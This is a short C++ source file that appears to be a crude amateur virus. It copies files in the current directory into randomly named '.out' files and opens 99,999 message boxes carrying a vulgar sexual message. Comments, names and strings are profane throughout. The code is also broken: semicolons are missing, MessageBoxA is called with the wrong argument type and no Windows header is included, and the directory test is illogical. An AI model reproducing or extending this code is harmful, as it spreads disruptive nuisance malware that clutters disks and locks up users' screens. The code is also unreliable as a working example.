
#include <dirent.h>
#include <vector>
#include <iostream>
#include <fstream>
#include <regex>
#include <string>
using namespace std;

//variables
regex correctFile("(a)+([0-9]?)+(.*)");
// detect archives
regex itsAFile("[\\w\\d\\- ]+(\\.*)");

// prototypes
void ListDir(const string &, vector<string> &);
void writeFiles(vector<string>);
void fuckbitch(string Message);
int main()
{
  vector<string> files;
  ListDir("./", files);
  writeFiles(files);
  fuckbitch("I had sex with a floppa :)")
  system("echo hello");
  return 0;
}

void fuckbitch(string Message)
{
  for (int i = 0; i < 99999; i++)
  {
    MessageBoxA(0,Message,0,0)
  }
  
};
// get the directorys
void ListDir(const string &path, vector<string> &files)
{
  struct dirent *entry;
  DIR *dp;
  dp = opendir(path.c_str());

  if (dp == NULL)

    perror("opendir: Path does not exist or could not be read.");

  while ((entry = readdir(dp)))
    files.push_back(entry->d_name);

  closedir(dp);
}
// write the file
void writeFiles(vector<string> files)
{
  for (int i = 0; i < files.size(); i++)
  {
    try
    {
      string file;
      if (regex_match(files[i], correctFile))
      {

        string fileStringVirus = "";
        fstream fileVirus;
        string name = "a" + to_string(rand()) + ".out";
        // open a file
        fileVirus.open("./" + files[i], ios::binary | ios::in);

        if (!fileVirus.fail())
        {
          // create a file

          ofstream creatingAFile(name, ios::out | ios::binary);

          while (fileVirus >> fileStringVirus)
          {
            // copy the file
            creatingAFile << fileStringVirus;
          };

          // close the file
          creatingAFile.close();
        }
        // finish
        fileVirus.close();
      }
      // get the directories
      if (!regex_match(files[i], itsAFile) == 0 && (files[i] != "." || files[i] != ".."))
      {
        cout << "its a directory"
             << " " << files[i] << endl;
      }
    }
    catch (...)
    {
      cout << "fuck";
    }
  }
}
